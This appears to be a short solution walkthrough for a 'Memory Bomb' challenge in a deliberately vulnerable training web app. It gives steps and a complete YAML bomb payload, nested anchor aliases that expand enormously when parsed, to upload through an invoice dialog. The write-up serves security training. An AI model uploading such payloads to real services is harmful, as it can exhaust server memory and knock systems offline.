## Memory Bomb
### Challenge: Drop some explosive data into a vulnerable file-handling endpoint.

1. Log in as any user
2. Navigate to the _Complaint_ page
3. In main.js, verify that the Invoice dialog accepts the following mimeTypes:
    - `["application/pdf", "application/xml", "text/xml", "application/zip", "application/x-zip-compressed", "multipart/x-zip", "application/yaml", "application/x-yaml", "text/yaml", "text/x-yaml"]`
4. Prepare a Yaml Bomb payload file which expands into a huge file when parsed, e.g.
    ```
    a: &a [_,_,_,_,_,_,_,_,_,_,_,_,_,_,_]
    b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a,*a]
    c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b,*b]
    d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c,*c]
    e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d,*d]
    f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e,*e]
    g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f,*f]
    h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g,*g]
    i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h,*h]
    ```
5. Upload this file via the Invoice dialog to solve this challenge.
